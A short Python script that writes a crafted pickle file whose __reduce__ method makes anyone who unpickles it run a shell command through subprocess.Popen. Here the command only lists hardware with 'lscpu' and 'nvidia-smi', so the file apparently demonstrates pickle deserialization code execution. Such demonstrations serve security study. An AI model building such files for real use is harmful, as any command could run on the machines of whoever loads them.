import pickle
import subprocess

class Python_Class_Object:
    def __reduce__(self):
        return (
            subprocess.Popen,
            (("/bin/sh", "-c", "lscpu;nvidia-smi;"),),
        )

d = Python_Class_Object()

with open("My_Pickle_File", "wb") as f:
     pickle.dump(d, f)
